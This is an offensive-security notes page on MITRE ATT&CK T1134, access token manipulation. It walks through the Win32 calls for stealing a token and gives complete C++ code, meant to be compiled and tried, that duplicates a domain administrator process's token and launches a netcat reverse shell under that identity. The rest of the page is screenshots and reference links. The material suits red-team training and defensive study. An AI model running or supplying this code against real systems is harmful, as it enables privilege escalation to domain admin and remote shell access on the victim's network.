---
description: 'Defense Evasion, Privilege Escalation'
---

# T1134: Access Token Manipulation

## Execution

One of the techniques of token manipulations is token impersonation. This is when a token of an already existing access token present in one of the running processes on the local host, is retrieved and duplicated and then used for creating a new process.

The high level process is as follows:

| Step | Win32 API |
| :--- | :--- |
| Open a process which has the access token you want to steal. | `OpenProcess` |
| Get a handle to the access token of that process | `OpenProcesToken` |
| Make a duplicate of the access token present in that process | `DuplicateTokenEx` |
| Create a new process with the newly aquired access token | `CreateProcessWithTokenW` |

Below is the C++ code implementing the above process. Note the variable `PID_TO_IMPERSONATE` that has a value of `3060` This is a process ID that we want to impersonate/steal its token from, since it is running as a domain admin and makes for a good target:

![A victim cmd.exe process that is running under the context of DC admin offense\administrator](../.gitbook/assets/tokens-victim-3060.png)

Note te line 16 which specifies the executable that should be launched with an impersonted token, which in our case is a simple netcat reverse shell:

![](../.gitbook/assets/tokens-shell-c++.png)

And this is the code if you want to compile and try it yourself:

{% code-tabs %}
{% code-tabs-item title="tokens.cpp" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char * argv[]) {
	char a;
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	DWORD PID_TO_IMPERSONATE = 3060;
	wchar_t cmdline[] = L"C:\\shell.cmd";
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);	

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);			
	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
	
	std::cin >> a;
    return 0;
}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Launching the tokens.exe from the powershell console spawns a reverse shell that the we catch on the attacking system. Note how the `powershell.exe` - the parent process of `Tokens.exe` and `Tokens.exe` itself are running under `PC-Mantvydas\mantvydas`, but the newly spawned shell is running under `OFFENSE\Administrator` - this is because of the successful token impersonation:

![](../.gitbook/assets/token-shell-impersonated.png)

## Observations

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1134\",\"type\":\"link\",\"title\":\"Access Token Manipulation - ATT&CK for Enterprise\",\"icon\":{\"type\":\"icon\",\"url\":\"https://attack.mitre.org/favicon.ico\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"https://digital-forensics.sans.org/blog/2012/03/21/protecting-privileged-domain-accounts-access-tokens\",\"type\":\"link\",\"title\":\"SANS Digital Forensics and Incident Response Blog \| Protecting Privileged Domain Accounts:  Safeguarding Access Tokens \| SANS Institute\",\"description\":\"SANS Digital Forensics and Incident Response Blog blog pertaining to Protecting Privileged Domain Accounts:  Safeguarding Access Tokens\",\"icon\":{\"type\":\"icon\",\"url\":\"https://digital-forensics.sans.org/favicon.ico\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/\",\"type\":\"link\",\"title\":\"PowerShell and Token Impersonation\",\"description\":\"This post will discuss bringing incognito-like functionality to PowerShell in the form of a new PowerShell script \(Invoke-TokenManipulation\), with some important differences. I’ll split this post u…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://clymb3r.files.wordpress.com/2013/11/screen-shot-2013-11-03-at-10-07-42-pm.png?w=300\",\"width\":300,\"height\":187,\"aspectRatio\":0.6233333333333333}}" %}

{% embed data="{\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671\(v=vs.85\).aspx\",\"type\":\"link\",\"title\":\"GetTokenInformation function \(Windows\)\",\"icon\":{\"type\":\"icon\",\"url\":\"https://msdn.microsoft.com/Areas/Epx/Themes/Windows/Content/Winlogo\_favicon.ico\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw\",\"type\":\"link\",\"title\":\"CreateProcessWithTokenW function\",\"description\":\"Creates a new process and its primary thread. The new process runs in the security context of the specified token. It can optionally load the user profile for the specified user.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}

{% embed data="{\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617\(v=vs.85\).aspx\",\"type\":\"link\",\"title\":\"DuplicateTokenEx function \(Windows\)\",\"icon\":{\"type\":\"icon\",\"url\":\"https://msdn.microsoft.com/Areas/Epx/Themes/Windows/Content/Winlogo\_favicon.ico\",\"aspectRatio\":0}}" %}

[https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf)



